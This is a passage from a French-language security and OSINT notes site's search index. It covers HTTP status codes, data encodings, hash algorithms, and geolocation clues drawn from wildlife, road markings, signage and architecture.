utilis\u00e9e pour des t\u00e9l\u00e9chargements. 300 Redirection Multiple Choices : Plusieurs options pour la ressource demand\u00e9e. 301 Redirection Moved Permanently : La ressource a \u00e9t\u00e9 d\u00e9plac\u00e9e de fa\u00e7on permanente. 302 Redirection Found (Temporary Redirect) : La ressource a \u00e9t\u00e9 temporairement d\u00e9plac\u00e9e. 303 Redirection See Other : La r\u00e9ponse \u00e0 la requ\u00eate peut \u00eatre trouv\u00e9e \u00e0 une autre URL. 304 Redirection Not Modified : La ressource n'a pas \u00e9t\u00e9 modifi\u00e9e depuis la derni\u00e8re requ\u00eate. 305 Redirection Use Proxy : La ressource doit \u00eatre acc\u00e9d\u00e9e via un proxy. 307 Redirection Temporary Redirect : La ressource est temporairement d\u00e9plac\u00e9e, utiliser la m\u00eame m\u00e9thode HTTP. 308 Redirection Permanent Redirect : Comme 301, mais ne change pas la m\u00e9thode HTTP utilis\u00e9e. 400 Erreur client Bad Request : Requ\u00eate mal form\u00e9e par le client. 401 Erreur client Unauthorized : Authentification requise pour acc\u00e9der \u00e0 la ressource. 402 Erreur client Payment Required : Code r\u00e9serv\u00e9 \u00e0 un usage futur. 403 Erreur client Forbidden : Acc\u00e8s refus\u00e9 \u00e0 la ressource. 404 Erreur client Not Found : La ressource demand\u00e9e est introuvable. 405 Erreur client Method Not Allowed : La m\u00e9thode HTTP utilis\u00e9e n'est pas autoris\u00e9e pour cette ressource. 406 Erreur client Not Acceptable : La ressource ne correspond pas aux crit\u00e8res de la requ\u00eate. 407 Erreur client Proxy Authentication Required : Authentification requise par un proxy. 408 Erreur client Request Timeout : Le client a pris trop de temps pour envoyer la requ\u00eate. 409 Erreur client Conflict : Conflit dans l'\u00e9tat actuel de la ressource. 410 Erreur client Gone : La ressource n'est plus disponible de fa\u00e7on permanente. 411 Erreur client Length Required : La requ\u00eate doit indiquer la taille de son corps. 412 Erreur client Precondition Failed : Une condition pr\u00e9alable \u00e0 la requ\u00eate a \u00e9chou\u00e9. 413 Erreur client Payload Too Large : Le corps de la requ\u00eate est trop volumineux. 414 Erreur client URI Too Long : L'URI de la requ\u00eate est trop long. 415 Erreur client Unsupported Media Type : Le format de la requ\u00eate n'est pas support\u00e9. 416 Erreur client Range Not Satisfiable : La plage demand\u00e9e ne peut pas \u00eatre fournie. 417 Erreur client Expectation Failed : L'attente du client ne peut pas \u00eatre satisfaite par le serveur. 418 Erreur client I'm a teapot : Code utilis\u00e9 comme une blague dans le protocole HTTC (RFC 2324). 421 Erreur client Misdirected Request : La requ\u00eate a \u00e9t\u00e9 dirig\u00e9e vers un serveur qui ne peut pas y r\u00e9pondre. 422 Erreur client Unprocessable Entity : La requ\u00eate est bien form\u00e9e mais contient des erreurs de logique. 423 Erreur client Locked : La ressource est verrouill\u00e9e. 424 Erreur client Failed Dependency : Une requ\u00eate pr\u00e9c\u00e9dente a \u00e9chou\u00e9, donc celle-ci aussi. 425 Erreur client Too Early : La requ\u00eate est envoy\u00e9e trop t\u00f4t. 426 Erreur client Upgrade Required : Le client doit passer \u00e0 un autre protocole pour continuer. 428 Erreur client Precondition Required : Une condition pr\u00e9alable est n\u00e9cessaire pour traiter la requ\u00eate. 429 Erreur client Too Many Requests : Le client a envoy\u00e9 trop de requ\u00eates en un laps de temps. 431 Erreur client Request Header Fields Too Large : Les champs d'en-t\u00eate de la requ\u00eate sont trop grands. 451 Erreur client Unavailable For Legal Reasons : La ressource n'est pas disponible pour des raisons l\u00e9gales. 500 Erreur serveur Internal Server Error : Le serveur a rencontr\u00e9 une condition inattendue. 501 Erreur serveur Not Implemented : Le serveur ne reconna\u00eet pas ou ne supporte pas la m\u00e9thode demand\u00e9e. 502 Erreur serveur Bad Gateway : Le serveur agit comme une passerelle et a re\u00e7u une r\u00e9ponse invalide. 503 Erreur serveur Service Unavailable : Le serveur est temporairement indisponible (surcharge ou maintenance). 504 Erreur serveur Gateway Timeout : Le serveur, en tant que passerelle, n'a pas re\u00e7u de r\u00e9ponse \u00e0 temps d'un autre serveur. 505 Erreur serveur HTTP Version Not Supported : La version du protocole HTTP n'est pas support\u00e9e. 506 Erreur serveur Variant Also Negotiates : Erreur de configuration du serveur. 507 Erreur serveur Insufficient Storage : Le serveur n'a pas assez de capacit\u00e9 pour traiter la requ\u00eate. 508 Erreur serveur Loop Detected : Le serveur a d\u00e9tect\u00e9 une boucle infinie dans le traitement de la requ\u00eate. 510 Erreur serveur Not Extended : Des extensions suppl\u00e9mentaires sont n\u00e9cessaires pour traiter la requ\u00eate. 511 Erreur serveur Network Authentication Required : Authentification r\u00e9seau requise pour acc\u00e9der \u00e0 la ressource."},{"location":"Misc/Encodages/","title":"Encodages","text":"Encodage Description Usages courants Avantages Limitations Base64 Encode des donn\u00e9es binaires en texte ASCII en utilisant 64 caract\u00e8res (A-Z, a-z, 0-9, +, /). Un caract\u00e8re de remplissage \"=\" est utilis\u00e9 pour s'assurer que les donn\u00e9es sont divisibles par 4. - Pi\u00e8ces jointes email (MIME). - Transmission de donn\u00e9es binaires dans des URL ou des JSON. - Compatible avec des syst\u00e8mes qui g\u00e8rent uniquement des cha\u00eenes de caract\u00e8res. - Encombrement : Augmente la taille des donn\u00e9es de 33%. URL Encoding Encode les caract\u00e8res sp\u00e9ciaux dans une URL en utilisant le symbole <code>%</code> suivi du code hexad\u00e9cimal correspondant (ex: espace \u2192 <code>%20</code>). - Utilis\u00e9 pour encoder les caract\u00e8res non autoris\u00e9s dans une URL (par ex. <code>?</code>, <code>&amp;</code>, <code>=</code>). - Permet de transf\u00e9rer des donn\u00e9es en toute s\u00e9curit\u00e9 dans une URL sans alt\u00e9rer leur signification. - Peut rendre une URL beaucoup plus longue et illisible. Hexadecimal Repr\u00e9sente des donn\u00e9es binaires sous forme de chiffres hexad\u00e9cimaux (0-9, A-F). Chaque octet est repr\u00e9sent\u00e9 par deux caract\u00e8res hexad\u00e9cimaux. - Protocoles r\u00e9seau (ex: adresses MAC). - Stockage de donn\u00e9es en basse couche. - Repr\u00e9sentation en crypto (hashing). - Repr\u00e9sentation concise et universelle des donn\u00e9es binaires. - La conversion directe peut \u00eatre moins intuitive pour les humains. ASCII Syst\u00e8me de codage qui repr\u00e9sente des caract\u00e8res en utilisant des valeurs num\u00e9riques sur 7 bits (128 caract\u00e8res), couvrant principalement l'alphabet anglais et des caract\u00e8res de contr\u00f4le. - Communication textuelle simple (ex: fichiers .txt, logs). - Protocole de base dans les syst\u00e8mes de r\u00e9seau. - L\u00e9ger et rapide, universellement support\u00e9. - Limit\u00e9 aux caract\u00e8res anglais, absence de prise en charge des langues non latines et symboles sp\u00e9ciaux. UTF-8 Codage de caract\u00e8res multi-octets qui utilise entre 1 et 4 octets pour repr\u00e9senter les caract\u00e8res Unicode. Il est r\u00e9trocompatible avec ASCII. - Standard pour le web. - Supporte des millions de caract\u00e8res Unicode, ce qui inclut la majorit\u00e9 des alphabets. - Tr\u00e8s efficace pour coder du texte en langues europ\u00e9ennes. - Moins efficace en termes de taille pour certaines langues o\u00f9 les caract\u00e8res n\u00e9cessitent plus d\u2019octets. UTF-16 Codage de caract\u00e8res qui utilise soit 2 soit 4 octets pour repr\u00e9senter les caract\u00e8res Unicode. Plus adapt\u00e9 pour les caract\u00e8res non-Latins. - Utilis\u00e9 principalement en interne dans certains syst\u00e8mes (ex: Windows). - Offre un bon compromis entre la prise en charge des caract\u00e8res complexes et l'efficacit\u00e9 de stockage. - Consomme plus de m\u00e9moire que UTF-8 pour les caract\u00e8res ASCII standards. UTF-32 Chaque caract\u00e8re Unicode est encod\u00e9 sur 4 octets. Cette approche garantit un acc\u00e8s direct \u00e0 chaque caract\u00e8re. - Utilis\u00e9 dans des applications n\u00e9cessitant un acc\u00e8s al\u00e9atoire \u00e0 des caract\u00e8res. - Simplicit\u00e9 d'acc\u00e8s, chaque caract\u00e8re a la m\u00eame taille. - Inefficace en termes de stockage : utilise beaucoup plus d'espace que UTF-8 et UTF-16. Binary/Octet Encoding Donn\u00e9es encod\u00e9es en repr\u00e9sentation binaire ou octale (base 8). Le binaire utilise 0 et 1, tandis que l'octal utilise 0 \u00e0 7. - Utilis\u00e9 pour les communications \u00e0 tr\u00e8s bas niveau (ex: en d\u00e9veloppement de mat\u00e9riel ou en stockage direct). - Offre une repr\u00e9sentation directe des donn\u00e9es binaires. - Difficile \u00e0 lire et manipuler pour des humains, rarement utilis\u00e9 en dehors de contextes sp\u00e9cialis\u00e9s. Quoted-Printable Encode des caract\u00e8res qui ne sont pas s\u00e9curis\u00e9s dans un format texte (comme les caract\u00e8res non-ASCII) en les repr\u00e9sentant sous forme de caract\u00e8res imprimables. - Courriers \u00e9lectroniques MIME. - Transmission de texte dans des formats qui ne supportent que des caract\u00e8res imprimables. - Facilement lisible pour les humains tout en permettant l'encodage de donn\u00e9es non-ASCII. - Peut augmenter consid\u00e9rablement la taille des donn\u00e9es \u00e0 transmettre. Punycode Encode des noms de domaine Unicode en ASCII, ce qui est utilis\u00e9 pour les noms de domaine internationalis\u00e9s (IDN). - Domaines internet avec des caract\u00e8res non-ASCII (ex: chinois, arabe). - Compatible avec le DNS, qui ne supporte que les caract\u00e8res ASCII. - Les noms de domaine encod\u00e9s peuvent devenir plus longs et complexes."},{"location":"Misc/Hash/","title":"Hash","text":"Algorithme Description Taille de sortie Usages courants Avantages Limites MD5 Algorithme de hachage largement utilis\u00e9 dans le pass\u00e9, d\u00e9sormais consid\u00e9r\u00e9 comme obsol\u00e8te en raison de vuln\u00e9rabilit\u00e9s aux collisions. 128 bits (16 octets) - Empreintes num\u00e9riques- Sommes de contr\u00f4le- V\u00e9rifications d'int\u00e9grit\u00e9 (non s\u00e9curis\u00e9es) - Rapide \u00e0 calculer- Bon pour les v\u00e9rifications d'int\u00e9grit\u00e9 de fichiers non critiques. - Vuln\u00e9rable aux collisions (deux donn\u00e9es diff\u00e9rentes produisant le m\u00eame hash)- Consid\u00e9r\u00e9 comme non s\u00e9curis\u00e9. SHA-1 Algorithme plus s\u00e9curis\u00e9 que MD5 mais \u00e9galement obsol\u00e8te en raison de vuln\u00e9rabilit\u00e9s aux collisions d\u00e9couvertes. 160 bits (20 octets) - Anciennement utilis\u00e9 pour les signatures num\u00e9riques et les certificats SSL - L\u00e9g\u00e8rement plus s\u00e9curis\u00e9 que MD5- Encore utilis\u00e9 dans des contextes non sensibles. - Vuln\u00e9rable aux attaques par collision depuis 2017.- Remplac\u00e9 par SHA-2 et SHA-3 pour des usages s\u00e9curis\u00e9s. SHA-256 Partie de la famille SHA-2, algorithme de hachage s\u00e9curis\u00e9 largement utilis\u00e9 aujourd'hui. 256 bits (32 octets) - Certificats SSL- Signatures num\u00e9riques- Stockage s\u00e9curis\u00e9 des mots de passe- Blockchain - Tr\u00e8s s\u00e9curis\u00e9 contre les collisions et les attaques de pr\u00e9image. - Plus lent \u00e0 calculer que MD5 ou SHA-1, mais avec un meilleur niveau de s\u00e9curit\u00e9. SHA-512 Variante plus s\u00e9curis\u00e9e et plus large de SHA-256, avec une sortie de 512 bits. 512 bits (64 octets) - Applications n\u00e9cessitant un niveau de s\u00e9curit\u00e9 tr\u00e8s \u00e9lev\u00e9- Stockage de mots de passe - Offre une tr\u00e8s grande r\u00e9sistance contre les attaques cryptographiques.- Efficace m\u00eame avec de tr\u00e8s grands fichiers. - Consomme plus de ressources que SHA-256.- Peut \u00eatre excessif pour des applications standards. SHA-3 Nouvelle g\u00e9n\u00e9ration de SHA, bas\u00e9e sur une approche diff\u00e9rente de SHA-2 (Keccak). Variables (224, 256, 384, 512) - S\u00e9curit\u00e9 avanc\u00e9e- Utilis\u00e9 dans des syst\u00e8mes de cryptographie moderne et pour des applications post-quantum. - Plus s\u00e9curis\u00e9 que SHA-2, r\u00e9sistant aux attaques post-quantum- Flexible en termes de taille de sortie. - Moins adopt\u00e9 que SHA-2 pour l'instant, mais en expansion. RIPEMD-160 Algorithme de hachage moins courant, d\u00e9velopp\u00e9 en Europe, con\u00e7u pour \u00eatre similaire \u00e0 SHA-1 mais plus s\u00e9curis\u00e9. 160 bits (20 octets) - Utilis\u00e9 dans certaines applications de cryptographie comme Bitcoin. - S\u00e9curis\u00e9 et non vuln\u00e9rable aux attaques trouv\u00e9es dans MD5 et SHA-1. - Moins utilis\u00e9 et support\u00e9 que les algorithmes de la famille SHA.- SHA-2 est g\u00e9n\u00e9ralement pr\u00e9f\u00e9r\u00e9. Whirlpool Algorithme de hachage con\u00e7u pour fonctionner sur 512 bits, bas\u00e9 sur AES. 512 bits (64 octets) - Syst\u00e8mes de cryptographie n\u00e9cessitant une s\u00e9curit\u00e9 accrue. - Taille de sortie de 512 bits, haute s\u00e9curit\u00e9- Con\u00e7u pour les syst\u00e8mes de stockage et les signatures num\u00e9riques. - Moins largement adopt\u00e9 que SHA-2 ou SHA-3. BLAKE2 Successeur du BLAKE (un finaliste de la comp\u00e9tition SHA-3), rapide et s\u00e9curis\u00e9, con\u00e7u pour \u00eatre une alternative \u00e0 MD5 et SHA-2. Variables (256, 512 bits) - Applications n\u00e9cessitant un hachage rapide et s\u00e9curis\u00e9. - Tr\u00e8s rapide par rapport \u00e0 SHA-2 et SHA-3, tout en restant s\u00e9curis\u00e9.- Flexible avec des tailles de sortie. - Encore peu utilis\u00e9 en dehors de certaines communaut\u00e9s de d\u00e9veloppeurs. Argon2 Algorithme de d\u00e9rivation de cl\u00e9 et de hachage de mot de passe, gagnant du Password Hashing Competition (PHC) en 2015. Variables - Stockage s\u00e9curis\u00e9 de mots de passe (hashing) - Con\u00e7u pour r\u00e9sister aux attaques par force brute sur les mots de passe.- Param\u00e9trable (m\u00e9moire, temps, etc.). - N\u00e9cessite plus de configuration que des algorithmes comme SHA-256. bcrypt Algorithme de hachage con\u00e7u sp\u00e9cifiquement pour le stockage s\u00e9curis\u00e9 des mots de passe. Variable (g\u00e9n\u00e9ralement 184 bits) - Stockage de mots de passe dans les syst\u00e8mes modernes - Utilise un facteur de co\u00fbt ajustable, augmentant le temps de calcul pour r\u00e9sister aux attaques par force brute. - Relativement plus lent que SHA-256 ou SHA-512, ce qui est intentionnel pour renforcer la s\u00e9curit\u00e9. scrypt Algorithme de hachage de mot de passe con\u00e7u pour \u00eatre co\u00fbteux en termes de calcul et de m\u00e9moire, emp\u00eachant les attaques par mat\u00e9riel sp\u00e9cialis\u00e9 (ASIC). Variable - Stockage de mots de passe- Cryptomonnaies (ex: Litecoin). - R\u00e9sistant aux attaques par force brute et aux attaques mat\u00e9rielles.- Peut \u00eatre ajust\u00e9 en termes de consommation m\u00e9moire. - Plus complexe \u00e0 impl\u00e9menter que bcrypt ou Argon2. Tiger Algorithme de hachage rapide souvent utilis\u00e9 dans des environnements contraints, comme les syst\u00e8mes embarqu\u00e9s. 192 bits (24 octets) - V\u00e9rifications d'int\u00e9grit\u00e9- Hachage dans des environnements limit\u00e9s en ressources. - Con\u00e7u pour \u00eatre rapide sur des architectures 64 bits.- Bon pour des contextes de faible performance. - Moins s\u00e9curis\u00e9 et moins adopt\u00e9 que SHA-2.- Vuln\u00e9rable \u00e0 certaines attaques cryptographiques. HAVAL Algorithme de hachage configurable, il permet de choisir la taille de sortie et le nombre de passes de hachage. Variables (128, 160, 192, 224, 256 bits) - Utilis\u00e9 dans des syst\u00e8mes qui n\u00e9cessitent un hachage flexible. - Tr\u00e8s flexible (nombre de passes, taille de sortie).- Peut augmenter la s\u00e9curit\u00e9 par plusieurs passes. - Peu utilis\u00e9 aujourd'hui.- Moins s\u00e9curis\u00e9 que SHA-2 ou SHA-3 en termes de r\u00e9sistance aux attaques. FNV (Fowler-Noll-Vo) Algorithme de hachage non cryptographique tr\u00e8s rapide, utilis\u00e9 dans des contextes de hachage de donn\u00e9es (ex: tables de hachage). 32, 64, 128 bits - Tables de hachage- Algorithmes de recherche. - Tr\u00e8s rapide et simple \u00e0 impl\u00e9menter.- Bien adapt\u00e9 pour des structures de donn\u00e9es non s\u00e9curis\u00e9es. - Non s\u00e9curis\u00e9 pour des usages cryptographiques.- Vuln\u00e9rable aux attaques de collision d\u00e9lib\u00e9r\u00e9es. GOST Algorithme de hachage d\u00e9velopp\u00e9 en Russie, utilis\u00e9 dans certaines normes locales. 256 bits - Utilis\u00e9 principalement dans des applications russes et post-sovi\u00e9tiques. - Reconnu pour sa s\u00e9curit\u00e9 dans certains syst\u00e8mes r\u00e9glement\u00e9s. - Moins adopt\u00e9 \u00e0 l'international.- Moins document\u00e9 et audit\u00e9 par la communaut\u00e9 internationale. CRC32 Algorithme de hachage non cryptographique utilis\u00e9 principalement pour la v\u00e9rification d'int\u00e9grit\u00e9 des donn\u00e9es (contr\u00f4le de redondance cyclique). 32 bits - V\u00e9rification d'int\u00e9grit\u00e9- Sommes de contr\u00f4le pour d\u00e9tecter des erreurs dans des fichiers ou des paquets. - Tr\u00e8s rapide et efficace pour d\u00e9tecter les erreurs de transmission. - Non cryptographique : vuln\u00e9rable aux collisions intentionnelles.- Inadapt\u00e9 pour des contextes de s\u00e9curit\u00e9."},{"location":"Misc/Table%20ASCII/","title":"Table ASCII","text":""},{"location":"Osint/Lieux/Animaux%20sauvages/","title":"Animaux sauvages","text":""},{"location":"Osint/Lieux/Animaux%20sauvages/#introduction","title":"Introduction","text":"<p>L'observation d'animaux sauvages dans leur habitat naturel peut fournir des indices cruciaux sur le continent, le pays, voire l'\u00e9cosyst\u00e8me sp\u00e9cifique (for\u00eat, savane, d\u00e9sert, montagne...). Certains animaux ont une aire de r\u00e9partition tr\u00e8s limit\u00e9e, ce qui en fait d'excellents marqueurs g\u00e9ographiques. Cependant, l'identification doit \u00eatre pr\u00e9cise et il faut tenir compte de la raret\u00e9 des observations, des esp\u00e8ces introduites et de la possible confusion avec des animaux domestiques.</p>"},{"location":"Osint/Lieux/Animaux%20sauvages/#1-elements-cles-a-analyser","title":"1. \u00c9l\u00e9ments Cl\u00e9s \u00e0 Analyser","text":"<ul> <li> <p>Identification de l'Esp\u00e8ce : Mammif\u00e8re, oiseau, reptile ? Caract\u00e9ristiques distinctives (taille, couleur, forme, cornes/bois, motifs...).</p> </li> <li> <p>Habitat Apparent : L'animal est-il dans un environnement qui correspond \u00e0 son aire de r\u00e9partition connue (for\u00eat, plaine, zone humide, d\u00e9sert...) ?</p> </li> <li> <p>Comportement : Solitaire ou en groupe/troupeau ? Diurne ou nocturne (si l'heure est connue) ?</p> </li> <li> <p>Signes Indirects : Traces, empreintes, d\u00e9jections, nids (plus difficiles \u00e0 exploiter en OSINT classique, mais peuvent \u00eatre utiles dans des enqu\u00eates sp\u00e9cifiques).</p> </li> </ul>"},{"location":"Osint/Lieux/Animaux%20sauvages/#2-mammiferes-indicateurs-exemples-par-region","title":"2. Mammif\u00e8res Indicateurs (Exemples par R\u00e9gion)","text":"<ul> <li> <p>Afrique :</p> <ul> <li> <p>Grands Herbivores : \u00c9l\u00e9phant d'Afrique (grandes oreilles), Girafe, Z\u00e8bre (motifs des rayures varient l\u00e9g\u00e8rement), Gnou, diverses Antilopes (Springbok, Impala, Koudou...), Rhinoc\u00e9ros (blanc/noir), Hippopotame.</p> </li> <li> <p>Grands Carnivores : Lion, L\u00e9opard, Gu\u00e9pard, Hy\u00e8ne.</p> </li> <li> <p>Primates : Babouins, Vervets, L\u00e9muriens (uniquement \u00e0 Madagascar !). </p> </li> </ul> </li> <li> <p>Australie :</p> <ul> <li> <p>Marsupiaux : Kangourou (diff\u00e9rentes esp\u00e8ces/tailles), Wallaby, Koala, Wombat. Tr\u00e8s forts indicateurs. </p> </li> <li> <p>Autres : Dingo (chien sauvage), \u00c9meu (grand oiseau incapable de voler).</p> </li> </ul> </li> <li> <p>Am\u00e9rique du Nord :</p> <ul> <li> <p>Grands Herbivores : Bison d'Am\u00e9rique, Orignal (Moose - tr\u00e8s grands bois plats), Wapiti (Elk), Cerf de Virginie (White-tailed deer), Cerf Mulet (Mule deer). </p> </li> <li> <p>Ours : Ours Noir, Grizzly/Ours Brun (bosse sur les \u00e9paules).</p> </li> <li> <p>Autres : Raton laveur, Coyote, Chien de prairie, Tatou (Sud USA), \u00c9cureuils (esp\u00e8ces varient).</p> </li> </ul> </li> <li> <p>Am\u00e9rique du Sud :</p> <ul> <li> <p>Cam\u00e9lid\u00e9s Andins : Lama, Alpaga (souvent domestiqu\u00e9s), Vigogne, Guanaco (sauvages). </p> </li> <li> <p>Autres : Capybara (plus gros rongeur du monde), Singes du Nouveau Monde (petits, souvent queue pr\u00e9hensile), Paresseux, Fourmilier, Jaguar (tr\u00e8s rare \u00e0 voir). </p> </li> </ul> </li> <li> <p>Asie :</p> <ul> <li> <p>Grands Mammif\u00e8res : \u00c9l\u00e9phant d'Asie (oreilles plus petites que l'africain), Tigre (tr\u00e8s rare \u00e0 voir), L\u00e9opard, Rhinoc\u00e9ros d'Asie.</p> </li> <li> <p>Primates : Macaques (tr\u00e8s r\u00e9pandus), Langurs, Orangs-outans (Born\u00e9o/Sumatra).</p> </li> <li> <p>Autres : Cerfs (Sika, Axis...), Chameau de Bactriane (2 bosses, Asie Centrale), Dromadaire (1 bosse, Moyen-Orient/Afrique du Nord - souvent domestiqu\u00e9), Panda G\u00e9ant (Chine uniquement !). </p> </li> </ul> </li> <li> <p>Europe :</p> <ul> <li> <p>Herbivores : Cerf \u00e9laphe, Chevreuil, Daim, Sanglier, Chamois/Isard/Bouquetin (montagnes), Renne/Caribou (Scandinavie, Russie). </p> </li> <li> <p>Carnivores : Renard roux, Loup gris (rare), Ours brun (rare), Lynx.</p> </li> <li> <p>Moins de grands mammif\u00e8res facilement visibles comparativement \u00e0 d'autres continents.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Animaux%20sauvages/#3-oiseaux-indicateurs","title":"3. Oiseaux Indicateurs","text":"<p>Les oiseaux peuvent \u00eatre plus difficiles \u00e0 identifier, mais certains sont tr\u00e8s distinctifs :</p> <ul> <li> <p>Grands Oiseaux Terrestres : Autruche (Afrique), \u00c9meu/Casoar (Australie), Nandou (Am\u00e9rique du Sud). </p> </li> <li> <p>Rapaces : Aigles (Pygargue \u00e0 t\u00eate blanche - Am. Nord), Vautours (esp\u00e8ces varient selon les continents), Condor des Andes.</p> </li> <li> <p>Oiseaux Aquatiques : P\u00e9licans (esp\u00e8ces varient), Flamants roses (zones humides sp\u00e9cifiques), Cigognes (Europe, Afrique), H\u00e9rons, Grues.</p> </li> <li> <p>Oiseaux Color\u00e9s / Exotiques : Toucans (Am\u00e9rique Latine), Perroquets/Aras (zones tropicales), Colibris (Am\u00e9riques).</p> </li> <li> <p>Oiseaux Marins : Macareux (c\u00f4tes Atlantique Nord), Albatros (oc\u00e9ans austraux), Manchots/Pingouins (H\u00e9misph\u00e8re Sud uniquement !). </p> </li> </ul>"},{"location":"Osint/Lieux/Animaux%20sauvages/#4-reptiles-et-amphibiens-indicateurs","title":"4. Reptiles et Amphibiens Indicateurs","text":"<p>Moins fr\u00e9quemment visibles ou identifiables de loin, mais parfois utiles :</p> <ul> <li> <p>Crocodiliens : Alligator (principalement Sud-Est USA, Chine), Crocodile (plus r\u00e9pandu : Afrique, Asie, Australie, Am\u00e9riques), Ca\u00efman (Am\u00e9rique Latine), Gavial (Inde - museau tr\u00e8s fin). Leur pr\u00e9sence indique un climat chaud et des zones d'eau douce/saum\u00e2tre. </p> </li> <li> <p>Grands L\u00e9zards : Iguanes (Am\u00e9riques), Varans (Afrique, Asie, Australie - ex: Dragon de Komodo en Indon\u00e9sie).</p> </li> <li> <p>Tortues : Tortues terrestres g\u00e9antes (Gal\u00e1pagos, Seychelles), tortues marines (plages de ponte sp\u00e9cifiques).</p> </li> </ul>"},{"location":"Osint/Lieux/Animaux%20sauvages/#5-limites-et-precautions","title":"5. Limites et Pr\u00e9cautions","text":"<ul> <li> <p>Visibilit\u00e9 / Raret\u00e9 : Beaucoup d'animaux sauvages sont discrets, nocturnes ou simplement rares. Ne pas voir un animal attendu ne signifie pas qu'on est au mauvais endroit.</p> </li> <li> <p>Identification Erron\u00e9e : De nombreuses esp\u00e8ces se ressemblent (ex: diff\u00e9rents types de cerfs, d'antilopes, de singes). Une identification pr\u00e9cise est cruciale.</p> </li> <li> <p>Esp\u00e8ces Introduites / Invasives : Des animaux ont \u00e9t\u00e9 introduits par l'homme hors de leur aire naturelle (lapins et renards en Australie, \u00e9cureuils gris au UK, ragondins en Europe...).</p> </li> <li> <p>Animaux Domestiques / F\u00e9raux : Attention \u00e0 ne pas confondre un animal sauvage avec un animal domestique retourn\u00e9 \u00e0 l'\u00e9tat sauvage (chevaux sauvages/mustangs, dromadaires en Australie, chats/chiens errants).</p> </li> <li> <p>Parcs Animaliers / Zoos : La pr\u00e9sence d'animaux exotiques dans un enclos ne renseigne pas sur la faune locale environnante.</p> </li> </ul>"},{"location":"Osint/Lieux/Animaux%20sauvages/#6-application-osint","title":"6. Application OSINT","text":"<ul> <li> <p>Fort Indice de Localisation : La vue d'un animal avec une aire de r\u00e9partition tr\u00e8s restreinte (Koala, L\u00e9murien, Panda, Vigogne...) est un indice extr\u00eamement fort.</p> </li> <li> <p>Corroboration d'Habitat : La pr\u00e9sence d'un animal confirme que l'environnement visible (v\u00e9g\u00e9tation, climat, relief) correspond \u00e0 son habitat naturel.</p> </li> <li> <p>Recherche Cibl\u00e9e : Une fois une esp\u00e8ce identifi\u00e9e (m\u00eame approximativement), rechercher son aire de r\u00e9partition (\"distribution map [animal name]\") permet de confirmer ou d'infirmer une hypoth\u00e8se de localisation. Utiliser des ressources comme l'IUCN Red List.</p> </li> </ul>"},{"location":"Osint/Lieux/Conseils%20g%C3%A9n%C3%A9raux/","title":"Conseils g\u00e9n\u00e9raux","text":""},{"location":"Osint/Lieux/Conseils%20g%C3%A9n%C3%A9raux/#1-infrastructure-routiere-et-mobilier-urbain","title":"1. Infrastructure Routi\u00e8re et Mobilier Urbain","text":"<ul> <li> <p>Marquage au Sol :</p> <ul> <li> <p>Couleur des lignes (blanches, jaunes).</p> </li> <li> <p>Type de lignes (continues, discontinues, doubles, z\u00e9bras, passages pi\u00e9tons sp\u00e9cifiques).</p> </li> <li> <p>Exemple : Lignes centrales jaunes = souvent Am\u00e9riques, Australie, Japon ; Lignes blanches = souvent Europe. Les passages pi\u00e9tons varient \u00e9norm\u00e9ment.</p> </li> </ul> </li> <li> <p>Panneaux de Signalisation :</p> <ul> <li> <p>Forme (octogonale pour STOP en Am\u00e9rique du Nord, triangle invers\u00e9 pour \"C\u00e9dez le passage\" quasi universel mais avec variations, etc.).</p> </li> <li> <p>Couleur de fond et de la bordure (rouge, blanc, jaune, bleu).</p> </li> <li> <p>Police de caract\u00e8res utilis\u00e9e (certaines sont tr\u00e8s sp\u00e9cifiques \u00e0 un pays).</p> </li> <li> <p>Langue et pictogrammes.</p> </li> </ul> </li> <li> <p>Feux de Circulation :</p> <ul> <li> <p>Disposition (horizontale ou verticale).</p> </li> <li> <p>Couleur du m\u00e2t (noir, jaune, gris...).</p> </li> <li> <p>Forme des feux ou pr\u00e9sence de r\u00e9p\u00e9titeurs sp\u00e9cifiques (ex: fl\u00e8ches, silhouettes de pi\u00e9ton/v\u00e9lo).</p> </li> <li> <p>Exemple : Feux horizontaux courants en Am\u00e9rique du Nord ; feux avec fond noir et contour blanc fr\u00e9quents au Japon.</p> </li> </ul> </li> <li> <p>Poteaux \u00c9lectriques/T\u00e9l\u00e9phoniques :</p> <ul> <li> <p>Mat\u00e9riau (bois, b\u00e9ton, m\u00e9tal).</p> </li> <li> <p>Design (forme des isolateurs, pr\u00e9sence de transformateurs sp\u00e9cifiques).</p> </li> <li> <p>Exemple : Poteaux en bois tr\u00e8s communs en Am\u00e9rique du Nord et Scandinavie ; poteaux en b\u00e9ton caract\u00e9ristiques dans certains pays d'Asie ou d'Europe de l'Est.</p> </li> </ul> </li> <li> <p>Bornes d'Incendie (Hydrants) :</p> <ul> <li>Couleur et forme varient \u00e9norm\u00e9ment selon les pays et m\u00eame les villes.</li> </ul> </li> <li> <p>Plaques d'\u00c9gout et Grilles :</p> <ul> <li> <p>Inscriptions (nom de la ville, de la fonderie).</p> </li> <li> <p>Design sp\u00e9cifique.</p> </li> </ul> </li> <li> <p>Bornes Kilom\u00e9triques / Poteaux Indicateurs :</p> <ul> <li>Design, couleur, informations indiqu\u00e9es (num\u00e9ro de route, distances).</li> </ul> </li> <li> <p>Bollards (Potelets Anti-Stationnement) :</p> <ul> <li>Le design peut \u00eatre tr\u00e8s sp\u00e9cifique \u00e0 une ville ou un pays.</li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Conseils%20g%C3%A9n%C3%A9raux/#2-architecture-et-batiments","title":"2. Architecture et B\u00e2timents","text":"<ul> <li> <p>Style Architectural G\u00e9n\u00e9ral :</p> <ul> <li> <p>Influence coloniale (espagnole, portugaise, fran\u00e7aise, britannique...).</p> </li> <li> <p>Architecture moderne sp\u00e9cifique (brutalisme, style scandinave...).</p> </li> <li> <p>Mat\u00e9riaux de construction dominants (brique rouge, pierre locale, bois, stuc, b\u00e9ton...).</p> </li> </ul> </li> <li> <p>Toits :</p> <ul> <li> <p>Forme (plats, en pente, \u00e0 pignon, mansard\u00e9s...).</p> </li> <li> <p>Mat\u00e9riau (tuiles en terre cuite - forme et couleur sp\u00e9cifiques, ardoise, t\u00f4le ondul\u00e9e, bardeaux...).</p> </li> </ul> </li> <li> <p>Fen\u00eatres et Portes :</p> <ul> <li>Forme, taille, pr\u00e9sence de volets (type et couleur), barreaux.</li> </ul> </li> <li> <p>Balcons et Climatiseurs :</p> <ul> <li>Design des balcons, type et fr\u00e9quence des unit\u00e9s de climatisation ext\u00e9rieures.</li> </ul> </li> <li> <p>Cl\u00f4tures et Murs :</p> <ul> <li>Mat\u00e9riaux et styles de 